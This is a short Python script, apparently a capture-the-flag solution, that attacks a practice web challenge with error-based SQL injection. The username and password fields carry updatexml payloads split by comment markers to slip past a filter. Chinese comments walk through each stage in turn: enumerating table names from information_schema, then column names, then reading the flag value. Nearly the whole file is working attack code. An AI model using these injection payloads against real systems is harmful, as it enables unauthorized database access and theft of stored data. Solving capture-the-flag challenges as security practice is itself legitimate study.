#coding=utf-8
'''
    :author mrli
    :date  
    :funcname
'''
# http://ctf5.shiyanbar.com/web/baocuo/index.php

import requests
sess = requests.session()



url = 'http://ctf5.shiyanbar.com/web/baocuo/index.php'


def showresultofresponse(headers,cookies,content,response):
    print (response)
    print (headers)
    print (cookies)
    print (content)

response = sess.get(url)
data = {
    # 获取 试错
    # 'username':'admin/*',
    # 'password':' \'or pcat() or \'1'
    # 获取表名 ffll44jj
    # 'username':'\' or updatexml/*',
    # 'password':'*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())),1) or \''
    # 获取字段名 value
    # 'username':'\' or updatexml/*',
    # 'password':'*/(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name regexp \'ffll44jj\')),1) or\''
    # 获取flag
    'username':'\'or updatexml/*',
    'password':'*/(1,concat(0x3a,(select value from ffll44jj)),1) or \''
}
showresultofresponse(sess.headers,sess.cookies,response.content,response)

response = sess.post(url,data=data)
showresultofresponse(sess.headers,sess.cookies,response.content,response)

if __name__ == '__main__':
    pass